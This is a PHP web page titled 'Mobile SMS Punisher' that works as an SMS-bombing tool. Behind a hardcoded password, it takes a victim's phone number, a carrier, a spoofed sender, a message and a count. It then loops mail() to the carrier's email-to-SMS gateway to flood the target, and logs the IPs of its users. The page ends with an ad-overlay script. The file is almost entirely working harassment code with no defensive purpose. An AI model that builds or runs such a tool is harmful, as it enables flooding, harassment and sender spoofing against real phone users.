<p style="text-align: center;">
IP's are being logged.
</p>

<?php

session_start();
// Change Your Password Here
$v_PASSWORD = "nicedude";

$v_USER_IP = $_SERVER['REMOTE_ADDR'];

$v_DATE = date( 'l jS \of F Y h:i:s A' );
$v_LOG_FILE = fopen( "Log.txt", a );
// Mobile Punish
echo'<html>
   <body bgcolor="black" text="#33ff00">
   <table align="center" cellspacing="5">

   <tr><td colspan=2 align="center"> <font size="6"><strong>Mobile SMS Punisher</strong></font> <br /><font color="#FF0000">by <br />Kilobits</font></td></tr>';

if(( $_POST['pass_submit'] && $_POST['pass'] == $v_PASSWORD ) || $_SESSION['loggedin'] == 1 )
{
    $_SESSION['loggedin'] = 1;
// The Name You Save Your .php file as  can be changed here.  Change "index.php" to your choosing if you named your saved file different
    echo'<form action="index.php" method="post" name="submit">
       <tr><td></td></tr>

       <tr>
           <td align="right" width="40%">Carrier: </td>
             <td>
                 <select name="carrier">
         <option value="tmobile">T-Mobile</option>
          <option value="virginmobile">Virgin Mobile</option>
          <option value="cingular">ATT</option>
          <option value="sprint">Sprint</option>
          <option value="verizon">Verizon</option>
          <option value="nextel">Nextel</option>
                 </select>
             </td>
       </tr>

       <tr>
           <td align="right">Number: </td>
           <td><input type="text" name="number" /></td>
       </tr>

       <tr>
           <td align="right">From: </td>
           <td><input type="text" name="from" /></td>
       </tr>

       <tr>
           <td align="right">Subject: </td>
           <td><input type="text" name="sub" /></td>
       </tr>

       <tr>
           <td align="right">Message: </td>
           <td><input type="text" name="body" /></td>
       </tr>

       <tr>
           <td align="right">Count: </td>
           <td><input type="text" name="count" /></td>
       </tr>

       <tr>
           <td colspan=2 align="center"><input type="submit" name="submit" value="BOMB IT" /></td>



       </tr>
   </form>';

    fwrite( $v_LOG_FILE, $v_USER_IP." ACCESSED THIS TOOL ON [ ".$v_DATE." ]"."\n" );

    if( $_POST['submit'] )
    {
        $v_NUMBER = $_POST['number'];

        $v_FROM  = 'MIME-Version: 1.0' . "\r\n";
        $v_FROM .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        $v_FROM .= 'From: ' . $_POST['from'] . '<' . $_POST['from'] . '>' . "\r\n";

        $v_COUNT      = $_POST['count'];
        $v_SUBJECT  = $_POST['sub'];
        $v_BODY      = $_POST['body'];
        $v_CARRIER  = $_POST['carrier'];

        if( $v_CARRIER == "tmobile" )
            $v_CARRIER = $v_NUMBER."@tmomail.net";
        else if( $v_CARRIER == "virginmobile" )
                 $v_CARRIER = $v_NUMBER."@vmobl.com";
        else if( $v_CARRIER == "cingular" )
                 $v_CARRIER = $v_NUMBER."@cingularme.com";
        else if( $v_CARRIER == "sprint" )
                 $v_CARRIER = $v_NUMBER."@messaging.sprintpcs.com";
        else if( $v_CARRIER == "verizon" )
                 $v_CARRIER = $v_NUMBER."@vtext.com";
        else if( $v_CARRIER == "nextel" )
                 $v_CARRIER = $v_NUMBER."@nextel.com";
        else
            die( "Invalid Selection." );

        for( $i = 0; $i < $v_COUNT; $i++ )
        {
            mail( $v_CARRIER, $v_SUBJECT, $v_BODY, $v_FROM );
        }

        fwrite( $v_LOG_FILE, $v_USER_IP." Bombed [ ".$v_NUMBER." ] On [ ".$v_DATE." ] [ ".$v_COUNT." ] Times\n" );

        echo '<div align="center"><font size="6">';
        echo "Bomed ".$v_NUMBER." ".$v_COUNT." times!";
        echo '</font></div>';
    }
}
else
{
    if( $_POST['pass_submit'] )
    {
        if( $_POST['pass'] != "" )
        {
            echo'<tr><td colspan=2 align="center"> <font size="6" color="#FF0000" ><strong>INVALID PASS!</strong></font></td></tr>';
            fwrite( $v_LOG_FILE, $v_USER_IP." FAILED LOGIN ON [ ".$v_DATE." ]\n" );
        }
        else if( $_POST['pass'] == "" )
        {
            echo'<tr><td colspan=2 align="center"> <font size="6" color="#FF0000" ><strong>ENTER A PASS!</strong></font></td></tr>';
        }
    }

    echo'<form action="index.php" method="post" name="pass_submit">
 <tr><td></td></tr>
 <tr>
   <td align="center"><font color="#ff">Password: </font></td>
 </tr>

     <tr>
       <td align="center"><input type="text" name="pass" /></td>
     </tr>

     <tr>
       <td colspan=2 align="center"><input type="submit" name="pass_submit" value="Login" /></td>
     </tr>
     </form>';
}

echo'</table>
    </body>
    </html>';

?>

<script type="text/javascript" src="http://adfoc.us/js/siteoverlay/script.js"></script>
<script type="text/javascript">
        var id_user = 10859;
        var frequency_cap = 50;
        var delay_nextad = 5;
        var delay_pageload = 0;
</script>